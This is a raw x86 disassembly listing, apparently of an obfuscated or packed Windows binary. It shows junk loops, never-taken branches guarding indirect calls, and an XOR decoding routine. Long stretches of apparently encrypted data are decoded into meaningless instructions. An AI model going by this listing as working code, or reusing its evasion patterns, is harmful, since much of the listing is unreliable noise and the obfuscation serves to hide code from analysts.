  4101c8:	push   edi
  4101c9:	mov    dh,0x7a
  4101cb:	rol    dl,cl
  4101cd:	fnstcw WORD PTR [esi-0x5a]
  4101d0:	pusha  
  4101d1:	out    0xae,eax
  4101d3:	add    ch,BYTE PTR [ebx+0x255eb2f2]
  4101d9:	test   eax,0x59cb472c
  4101de:	mov    ds:0xbef27d92,al
  4101e3:	ins    BYTE PTR es:[edi],dx
  4101e4:	addr16 clc 
  4101e6:	push   esi
  4101e7:	push   edx
  4101e8:	cmp    al,al
  4101ea:	sbb    DWORD PTR [ebp+ebx*8+0x3],esp
  4101ee:	call   0x575e240e
  4101f3:	repnz cmp esp,DWORD PTR [edx+0x3e]
  4101f7:	imul   edi,edx,0xa29e9b4
  4101fd:	or     al,0xf8
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x9f,al
  41049c:	lds    esp,FWORD PTR [edx]
  41049e:	rcr    esp,0xb0
  4104a1:	jle    0x410521
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x41047f
  4104a8:	and    DWORD PTR [eax+0x5bec2c28],0x4f
  4104af:	mov    eax,ds:0x262448cd
  4104b4:	mov    ebx,0x12ff0f29
  4104b9:	in     al,0x5e
  4104bb:	aad    0x35
  4104bd:	loopne 0x410510
  4104bf:	cmp    DWORD PTR [ecx+0x7f],ebp
  4104c2:	rol    DWORD PTR [ecx-0x4a],1
  4104c5:	loop   0x4104bc
  4104c7:	aam    0x74
  4104c9:	das    
  4104ca:	cld    
  4104cb:	add    BYTE PTR [edi],bh
  4104cd:	in     al,dx
  4104ce:	int3   
  4104cf:	mov    al,0xce
  4104d1:	mov    edx,0xfeb0c6d6
  4104d6:	mov    edi,0xb32d4ab5
  4104db:	pop    esp
  4104dc:	neg    DWORD PTR [ecx-0x6b2e52a2]
  4104e2:	fadd   st(5),st
  4104e4:	(bad)  
  4104e5:	sbb    BYTE PTR [esi-0x33b72c78],dl
  4104eb:	ja     0x4104f6
  4104ed:	cwde   
  4104ee:	cmp    BYTE PTR [edx-0x3408eb0c],ah
  4104f4:	out    0x5d,al
  4104f6:	jnp    0x4104ca
  4104f8:	pop    edx
  4104f9:	or     BYTE PTR [edx],0xbd
  4104fc:	jbe    0x41049d
  4104fe:	push   ds
  4104ff:	xor    al,0x7b
  410501:	jp     0x41057f
  410503:	scas   al,BYTE PTR es:[edi]
  410504:	mov    edx,0x24329464
  410509:	sub    al,0x1f
  41050b:	mov    ebx,0x9af32909
  410510:	int3   
  410511:	mov    gs,WORD PTR [esi-0x70]
  410514:	cmp    ecx,esi
  410516:	repnz mov ds:0xab90dbd6,al
  41051c:	pusha  
  41051d:	adc    dh,BYTE PTR [edx+ecx*1]
  410520:	sub    BYTE PTR gs:0x78da37c8,dh
  410527:	imul   edi,DWORD PTR [esi],0xbfe8cd2
  41052d:	push   edx
  41052e:	jae    0x41054f
  410530:	popa   
  410531:	and    esp,edx
  410533:	and    eax,0x33d827fc
  410538:	enter  0x79ed,0xf3
  41053c:	inc    ecx
  41053d:	push   ecx
  41053e:	shr    DWORD PTR [esi],1
  410540:	mov    BYTE PTR [ebx+eax*4-0x9],bh
  410544:	jg     0x410559
  410546:	sub    ebp,DWORD PTR [edi-0xe46fbcb]
  41054c:	dec    esi
  41054d:	pop    edx
  41054e:	jle    0x410547
  410550:	lods   al,BYTE PTR ds:[esi]
  410551:	xor    bh,BYTE PTR [ebx]
  410553:	les    esi,FWORD PTR [eax+ebx*4-0x57811a3e]
  41055a:	lea    eax,[ebx-0x4625a9f7]
  410560:	dec    edi
  410561:	mov    ebp,0x5cb8cdaa
  410566:	(bad)  
  410567:	enter  0x8c6a,0x7c
  41056b:	retf   
  41056c:	int    0x1
  41056e:	push   esi
  41056f:	xor    al,0x2e
  410571:	aad    0x20
  410573:	fsub   DWORD PTR [ecx-0x30823bca]
  410579:	fcomp  DWORD PTR [edx-0x496095d7]
  41057f:	inc    ecx
  410580:	cwde   
  410581:	sti    
  410582:	out    0xcc,eax
  410584:	shl    BYTE PTR [edx-0x2f139e74],1
  41058a:	fbld   TBYTE PTR [ebp-0x5e5b3366]
  410590:	std    
  410591:	inc    ebp
  410592:	xlat   BYTE PTR ds:[ebx]
  410593:	pop    edi
  410594:	cdq    
  410595:	sub    DWORD PTR [edx+0x789a0593],ecx
  41059b:	popa   
  41059c:	push   eax
  41059d:	lea    edi,[ecx+ebx*1]
  4105a0:	xchg   BYTE PTR [esi+0x1],bh
  4105a3:	lods   al,BYTE PTR ds:[esi]
  4105a4:	dec    ebp
  4105a5:	lea    esi,[ebp-0x72]
  4105a8:	mov    bh,0x60
  4105aa:	xor    BYTE PTR [ebp-0x39],ah
  4105ad:	pop    ecx
  4105ae:	mov    edi,0x66eac093
  4105b3:	or     DWORD PTR [eax],esi
  4105b5:	jg     0x4105c1
  4105b7:	outs   dx,DWORD PTR ds:[esi]
  4105b8:	push   ds
  4105b9:	das    
  4105ba:	ins    BYTE PTR es:[edi],dx
  4105bb:	stc    
  4105bc:	ins    BYTE PTR es:[edi],dx
  4105bd:	ins    BYTE PTR es:[edi],dx
  4105be:	mov    edx,0x9e483e0a
  4105c3:	xor    eax,0x291c34c6
  4105c8:	call   0x78f4bcf8
  4105cd:	pop    eax
  4105ce:	push   0x9235c009
  4105d3:	push   ds
  4105d4:	in     eax,dx
  4105d5:	hlt    
  4105d6:	(bad)  [ebp+0x7508cf42]
  4105dc:	aas    
  4105dd:	retf   
  4105de:	mov    cl,0x9c
  4105e0:	aaa    
  4105e1:	ror    DWORD PTR [esi],cl
  4105e3:	jmp    0x8d85:0x6094af8d
  4105ea:	stos   DWORD PTR es:[edi],eax
  4105eb:	xchg   ecx,eax
  4105ec:	mov    bh,0xde
  4105ee:	out    0x98,eax
  4105f0:	leave  
  4105f1:	es enter 0x841a,0x8f
  4105f6:	hlt    
  4105f7:	pusha  
  4105f8:	or     eax,0x4028b1b6
  4105fd:	push   edx
  4105fe:	mov    bh,0x29
  410600:	(bad)  
  410601:	fadd   st,st(6)
  410603:	and    eax,0x2c57f591
  410608:	test   eax,0xf27f094
  41060d:	jg     0x410599
  41060f:	bound  esi,QWORD PTR [edx+0x7d0a6fbe]
  410615:	xor    ah,BYTE PTR [edx+ebp*1-0x268e1b9a]
  41061c:	and    edi,esp
  41061e:	push   ss
  41061f:	cdq    
  410620:	adc    BYTE PTR [edx+0x4dbe5cf],al
  410626:	lea    ecx,[edx+0xb605be9]
  41062c:	xor    DWORD PTR ds:0x73fb99ca,edx
  410632:	push   ecx
  410633:	jne    0x4105cd
  410635:	xlat   BYTE PTR ds:[ebx]
  410636:	sar    DWORD PTR [esi],0x90
  410639:	nop
  41063a:	stc    
  41063b:	daa    
  41063c:	ret    
  41063d:	pop    esp
  41063e:	add    DWORD PTR [ebx-0x5a6d8df2],edi
  410644:	and    esp,edi
  410646:	mov    bl,0x0
  410648:	mov    esi,0x97e59027
  41064d:	xchg   esp,eax
  41064e:	imul   edx,ebx,0xffffffcc
  410651:	adc    al,0x11
  410653:	sub    BYTE PTR [edi],0x11
  410656:	mov    esi,0xa8878220
  41065b:	inc    ebx
  41065c:	adc    ebx,edi
  41065e:	jl     0x4106a8
  410660:	add    eax,0x5507a658
  410665:	test   BYTE PTR [eax+0x1a],dh
  410668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410669:	push   ebx
  41066a:	aam    0x3
  41066c:	mov    ebx,0x94ae4180
  410671:	aas    
  410672:	xchg   esp,eax
  410673:	nop
  410674:	int    0xad
  410676:	ret    0xa507
  410679:	and    DWORD PTR [ebp-0x19],ebx
  41067c:	dec    esi
  41067d:	and    eax,0xda834552
  410682:	mov    ebx,0x30ae4ed4
  410687:	adc    al,0x22
  410689:	cmp    al,0xc4
  41068b:	add    eax,eax
  41068d:	push   es
  41068e:	jmp    eax
  410690:	outs   dx,DWORD PTR ds:[esi]
  410691:	sub    DWORD PTR [esi+ebp*8+0x3d1dec3c],ebx
  410698:	mov    esp,0x92e419b6
  41069d:	xor    DWORD PTR [edx-0x53],ebx
  4106a0:	sub    BYTE PTR [ebx],dh
  4106a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a3:	into   
  4106a4:	aaa    
  4106a5:	dec    ecx
  4106a6:	rcr    bh,0x8f
  4106a9:	xchg   ecx,eax
  4106aa:	cli    
  4106ab:	in     al,0xc7
  4106ad:	sbb    al,0x71
  4106af:	dec    ecx
  4106b0:	and    esi,ebp
  4106b2:	sub    al,dl
  4106b4:	test   eax,0xde744ca5
  4106b9:	retf   0xdc97
  4106bc:	add    edi,0xfde4d1a4
  4106c2:	mov    ds:0x220ef90a,al
  4106c7:	dec    ecx
  4106c8:	sar    BYTE PTR [ebx+0x59],0x54
  4106cc:	adc    ebp,esi
  4106ce:	dec    esi
  4106cf:	fdivr  DWORD PTR [esi]
  4106d1:	call   0x5d09:0x89e669bd
  4106d8:	inc    eax
  4106d9:	bnd jmp 0xc267671
  4106df:	push   ebp
  4106e0:	push   cs
  4106e1:	sbb    ebx,DWORD PTR [eax]
  4106e3:	sbb    al,0x8b
  4106e5:	or     DWORD PTR [ebp+0x59d9eb1f],ecx
  4106eb:	aad    0xfc
  4106ed:	and    al,bl
  4106ef:	gs push esp
  4106f1:	nop
  4106f2:	push   ecx
  4106f3:	mov    eax,0xd6d566
  4106f8:	add    al,0xb2
  4106fa:	jmp    0x958127c0
  4106ff:	adc    bl,ah
  410701:	aaa    
  410702:	mov    ch,0xbd
  410704:	ins    DWORD PTR es:[edi],dx
  410705:	aam    0x13
  410707:	jmp    0xeb3a:0x780a874b
  41070e:	in     eax,dx
  41070f:	outs   dx,BYTE PTR ds:[esi]
  410710:	or     al,BYTE PTR [edx+0x4112c221]
  410716:	add    eax,DWORD PTR [ebx+ebx*4]
  410719:	shr    BYTE PTR [esi+0x25],0x97
  41071d:	sar    BYTE PTR [ebx-0x40],cl
  410720:	mov    gs,WORD PTR [ebx+ebp*1+0x5708f0fd]
  410727:	mov    ecx,0x8d949d66
  41072c:	jne    0x4106cd
  41072e:	ds dec ecx
  410730:	call   0xdf1268
  410735:	lds    esi,FWORD PTR [edx-0x78f276ae]
  41073b:	out    dx,al
  41073c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41073d:	push   0x33
  41073f:	pusha  
  410740:	push   edi
  410741:	inc    ecx
  410742:	jnp    0x410797
  410744:	out    dx,eax
  410745:	fadd   QWORD PTR ds:0x45329402
  41074b:	dec    ebx
  41074c:	jno    0x410793
  41074e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41074f:	adc    BYTE PTR [ebx-0x6aec153f],cl
  410755:	mov    ebx,0x458bb6ac
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x7771e870
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410772
  41078c:	xchg   esi,eax
  41078d:	push   esi
  41078e:	into   
  41078f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410790:	ins    BYTE PTR es:[edi],dx
  410791:	and    DWORD PTR ds:0x3c6cc617,eax
  410797:	and    DWORD PTR [ebp+0x28ca8688],esi
  41079d:	dec    esp
  41079e:	mov    ds:0x558c56ce,eax
  4107a3:	inc    edx
  4107a4:	mov    esp,es
  4107a6:	jbe    0x410824
  4107a8:	xchg   ebp,eax
  4107a9:	scas   eax,DWORD PTR es:[edi]
  4107aa:	cmp    BYTE PTR [ecx+ebx*8+0x5],dh
  4107ae:	jb     0x410798
  4107b0:	add    al,0x68
  4107b2:	shr    BYTE PTR [ebx],1
  4107b4:	or     edi,ebx
  4107b6:	arpl   WORD PTR [ebp+0x79e663f5],ax
  4107bc:	(bad)  
  4107bd:	mov    ecx,0x17fc6a4
  4107c2:	(bad)  
  4107c3:	mov    eax,ds:0x20105f5f
  4107c8:	rcl    dh,cl
  4107ca:	fimul  WORD PTR [edx]
  4107cc:	mov    ds:0x3f1c8482,eax
  4107d1:	std    
  4107d2:	cmp    DWORD PTR [esi],edx
  4107d4:	mov    esp,0x18107de4
  4107d9:	popa   
  4107da:	addr16 jge 0x4107cd
  4107dd:	fistp  WORD PTR [edx]
  4107df:	dec    esp
  4107e0:	xchg   ebp,eax
  4107e1:	fiadd  DWORD PTR [eax]
  4107e3:	add    ecx,DWORD PTR [ebx]
  4107e5:	std    
  4107e6:	ss dec eax
  4107e8:	aas    
  4107e9:	mov    ch,0xce
  4107eb:	ins    BYTE PTR es:[edi],dx
  4107ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ed:	xchg   DWORD PTR [edi+0x4b418ba6],ecx
  4107f3:	pop    es
  4107f4:	inc    esi
  4107f5:	in     al,0x2c
  4107f7:	fstp   QWORD PTR [eax]
  4107f9:	mov    ds:0x32843d2c,eax
  4107fe:	sbb    ebp,DWORD PTR [esi]
  410800:	push   edx
  410801:	cmp    BYTE PTR [edi-0x3570ad17],0x17
  410808:	inc    edx
  410809:	cmp    al,0x63
  41080b:	lds    ecx,FWORD PTR [ecx+0x5e]
  41080e:	or     al,0x1d
  410810:	(bad)  
  410812:	mov    dl,0xb2
  410814:	fmulp  st(1),st
  410816:	pop    esp
  410817:	adc    eax,0xbf5a25c6
  41081c:	xor    al,BYTE PTR [edx+edx*8]
  41081f:	test   BYTE PTR [ebx-0x7f2ef305],al
  410825:	inc    edi
  410826:	inc    ecx
  410827:	in     ax,0x75
  41082a:	mov    bl,0x1b
  41082c:	inc    edi
  41082d:	xor    DWORD PTR [edi-0x15],edx
  410830:	and    ch,BYTE PTR [edi+ebx*2-0x59cccd76]
  410837:	sub    BYTE PTR ds:0x8afe22c1,0xda
  41083e:	dec    esp
  41083f:	rcl    DWORD PTR [ebx+0x3d970de0],0x16
  410846:	fadd   DWORD PTR [edi-0x4535e0bc]
  41084c:	(bad)  
  41084d:	push   esp
  41084e:	dec    esi
  41084f:	jae    0x4108a2
  410851:	adc    edx,DWORD PTR [edi+eax*4+0x2bde3954]
  410858:	mov    eax,0x22237dc4
  41085d:	test   BYTE PTR [esi-0x272e8d9d],bl
  410863:	cdq    
  410864:	inc    ecx
  410865:	pop    ds
  410866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410867:	sbb    DWORD PTR [edi],ecx
  410869:	push   esp
  41086a:	cli    
  41086b:	scas   al,BYTE PTR es:[edi]
  41086c:	out    dx,eax
  41086d:	add    DWORD PTR [eax+0x5f82af32],eax
  410873:	push   esi
  410874:	xor    DWORD PTR [ebx+0x10f1203e],0x36
  41087b:	rcr    BYTE PTR [ebp+eiz*4+0x41],0xe7
  410880:	mov    bh,0xbb
  410882:	dec    ebx
  410883:	fisubr DWORD PTR [edx-0x1042c162]
  410889:	push   eax
  41088a:	cmp    ebx,DWORD PTR [esi+0xc]
  41088d:	mov    ch,0xa3
  41088f:	das    
  410890:	push   edx
  410891:	into   
  410892:	fiadd  WORD PTR [ebp+0x7b930450]
  410898:	mov    eax,ds:0x48c4559a
  41089d:	jl     0x41087f
  41089f:	and    eax,0xab8df0c1
  4108a4:	adc    al,0xcd
  4108a6:	cmp    al,0x9b
  4108a8:	jno    0x4108f5
  4108aa:	jp     0x4108c7
  4108ac:	cs iret 
  4108ae:	mov    cx,0xd48
  4108b2:	jge    0x41088c
  4108b4:	je     0x410884
  4108b6:	jb     0x41086a
  4108b8:	retf   0xe8ae
  4108bb:	es xor esi,edi
  4108be:	lods   eax,DWORD PTR ds:[esi]
  4108bf:	jmp    0x39664d66
  4108c4:	stc    
  4108c5:	out    dx,al
  4108c6:	mov    ah,0x81
  4108c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108c9:	clc    
  4108ca:	lock jg 0x41093c
  4108cd:	push   DWORD PTR [ebp+0x63]
  4108d0:	pop    es
  4108d1:	xchg   ecx,eax
  4108d2:	jmp    0x4108b1
  4108d4:	(bad)  
  4108d5:	cwde   
  4108d6:	out    dx,eax
  4108d7:	push   edi
  4108d8:	jo     0x410891
  4108da:	xchg   BYTE PTR [ecx+edx*4+0x50],al
  4108de:	xor    al,0xf
  4108e0:	fwait
  4108e1:	mov    al,0xff
  4108e3:	js     0x410944
  4108e5:	fisub  DWORD PTR [ebx+0x734af2bd]
  4108eb:	test   BYTE PTR [edx],0x2b
  4108ee:	les    eax,FWORD PTR [edx]
  4108f0:	jl     0x4108c6
  4108f2:	inc    esi
  4108f3:	mov    al,ds:0x9343aa4e
  4108f8:	shl    BYTE PTR [ecx-0x4b],0x27
  4108fc:	xchg   ebp,eax
  4108fd:	push   ss
  4108fe:	push   eax
  4108ff:	dec    edi
  410900:	add    al,ch
  410902:	in     eax,0x3e
  410904:	add    ebp,esp
  410906:	les    ecx,FWORD PTR [ecx]
  410908:	lods   eax,DWORD PTR ds:[esi]
  410909:	sti    
  41090a:	jae    0x4108ab
  41090c:	cmp    eax,0x6e6ca749
  410911:	ins    DWORD PTR es:[edi],dx
  410912:	add    BYTE PTR [ebp-0x62],dl
  410915:	iret   
  410916:	xchg   esi,eax
  410917:	out    0xe7,al
  410919:	jo     0x410996
  41091b:	xlat   BYTE PTR ds:[ebx]
  41091c:	enter  0xfc4e,0xf
  410920:	mov    esp,DWORD PTR [ecx]
  410922:	xchg   esp,eax
  410923:	jns    0x410973
  410925:	shl    ah,0x92
  410928:	push   0xffffff87
  41092a:	mov    dl,0xc9
  41092c:	add    eax,0x3812109e
  410931:	mov    esi,0x2b7a5f09
  410936:	out    0x97,al
  410938:	aaa    
  410939:	mov    bh,0xc7
  41093b:	stos   DWORD PTR es:[edi],eax
  41093c:	mov    cs,ecx
  41093e:	repz lea esi,[ebx+eiz*8+0x5c]
  410943:	cmp    ah,bl
  410945:	xor    esp,DWORD PTR [ebp+eax*2+0x6b5d02f4]
  41094c:	pop    ds
  41094d:	ins    DWORD PTR es:[edi],dx
  41094e:	xor    dl,bl
  410950:	sbb    eax,0x5ac1941e
  410955:	stc    
  410956:	mov    al,bh
  410958:	push   ecx
  410959:	out    0x9f,al
  41095b:	mov    bl,BYTE PTR [ecx-0x2ee28bff]
  410961:	leave  
  410962:	aam    0xbe
  410964:	pusha  
  410965:	ds into 
  410967:	add    eax,0x836b7a34
  41096c:	cmp    DWORD PTR [edx+0x0],edi
  41096f:	push   cs
  410970:	jno    0x410989
  410972:	repnz cwde 
  410974:	jnp    0x410954
  410976:	gs (bad) 
  410978:	sbb    DWORD PTR [ebp+0xf0fbf6c],eax
  41097e:	xor    al,0x6b
  410980:	pop    eax
  410981:	ds mov al,0xd9
  410984:	add    ebx,DWORD PTR [ebx-0x5c8da20d]
  41098a:	pusha  
  41098b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41098c:	test   BYTE PTR [ebx+eax*4+0x53],0x95
  410991:	mov    edx,0xc3b9e3e4
  410996:	mov    eax,ds:0x518d42bd
  41099b:	mov    WORD PTR [ebx],ds
  41099d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41099e:	pop    edi
  41099f:	or     eax,0x8afb7461
  4109a4:	cs push ss
  4109a6:	pop    ss
  4109a7:	jnp    0x410971
  4109a9:	dec    edi
  4109aa:	cdq    
  4109ab:	out    0x5b,al
  4109ad:	xor    esi,edi
  4109af:	pop    eax
  4109b0:	ins    BYTE PTR es:[edi],dx
  4109b1:	xor    edi,DWORD PTR [ebp+0x40]
  4109b4:	outs   dx,BYTE PTR ds:[esi]
  4109b5:	mov    esi,0x792f416c
  4109ba:	sbb    bl,BYTE PTR [ecx+edi*2+0x7f]
  4109be:	repz fst QWORD PTR [eax+0x53]
  4109c2:	add    al,0xed
  4109c4:	inc    edx
  4109c5:	mov    ebx,0x4ea397a1
  4109ca:	push   ebx
  4109cb:	loop   0x410a08
  4109cd:	sbb    cl,ch
  4109cf:	popfw  
  4109d1:	call   0x31ac7d69
  4109d6:	(bad)  
  4109d7:	lock mov al,0x75
  4109da:	mov    WORD PTR [esi-0x7c],fs
  4109dd:	aam    0x4e
  4109df:	sahf   
  4109e0:	pop    edx
  4109e1:	jo     0x410979
  4109e3:	push   ebp
  4109e4:	adc    ebp,esp
  4109e6:	inc    eax
  4109e7:	inc    esi
  4109e8:	mov    DWORD PTR [ebp+0x2503152f],ecx
  4109ee:	inc    ebp
  4109ef:	sti    
  4109f0:	adc    al,0xe6
  4109f2:	or     BYTE PTR [ecx+ecx*4+0x7a],dh
  4109f6:	mov    dh,0xa
  4109f8:	fnstenv [edx]
  4109fa:	and    edx,DWORD PTR [esi-0x91c2bb8]
  410a00:	stos   DWORD PTR es:[edi],eax
  410a01:	jns    0x4109d8
  410a03:	ret    
  410a04:	aad    0x4d
  410a06:	pop    esi
  410a07:	adc    esp,DWORD PTR [ebp+0x4906043e]
  410a0d:	cs xchg edi,eax
  410a0f:	fdiv   st,st(2)
  410a11:	mov    ah,0x84
  410a13:	adc    esi,DWORD PTR [eax-0x7078b2b5]
  410a19:	inc    ecx
  410a1a:	or     ecx,0x54
  410a1d:	pop    esp
  410a1e:	dec    eax
  410a1f:	stos   BYTE PTR es:[edi],al
  410a20:	scas   al,BYTE PTR es:[edi]
  410a21:	xor    DWORD PTR [esi+ecx*4+0x7b11717a],eax
  410a28:	addr16 clc 
  410a2a:	jle    0x410a0a
  410a2c:	mov    dh,0xbb
  410a2e:	fdiv   st,st(5)
  410a30:	and    ebp,0x39
  410a33:	add    DWORD PTR [ecx-0x66],0xffffffa8
  410a37:	out    0x7a,al
  410a39:	dec    ebx
  410a3a:	push   ebx
  410a3b:	sbb    eax,0xc9e9c603
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	cld    
  410a50:	ficomp DWORD PTR [edx]
  410a52:	ins    BYTE PTR es:[edi],dx
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410ad4
  410a5c:	inc    eax
  410a5d:	sbb    al,0xa3
  410a5f:	in     eax,0xab
  410a61:	push   0xffffffd1
  410a63:	aad    0x68
  410a65:	popa   
  410a66:	sub    bh,BYTE PTR [edi]
  410a68:	and    BYTE PTR [edi-0x2936813d],0xa6
  410a6f:	inc    esi
  410a70:	sub    BYTE PTR [esi-0xd],bl
  410a73:	ror    DWORD PTR [edi-0x60],1
  410a76:	hlt    
  410a77:	sbb    edx,edi
  410a79:	adc    al,0xa3
  410a7b:	adc    eax,0x2575256f
  410a80:	and    ah,BYTE PTR ds:0x8ed54157
  410a86:	xchg   esi,eax
  410a87:	leave  
  410a88:	ret    
  410a89:	ins    BYTE PTR es:[edi],dx
  410a8a:	sub    al,0x8
  410a8c:	mov    ecx,DWORD PTR [ecx+0x1d294bbd]
  410a92:	pop    ss
  410a93:	push   ss
  410a94:	ret    
  410a95:	jle    0x410a51
  410a97:	seto   BYTE PTR [edx-0x1c]
  410a9b:	and    BYTE PTR [eax-0x49],0xc8
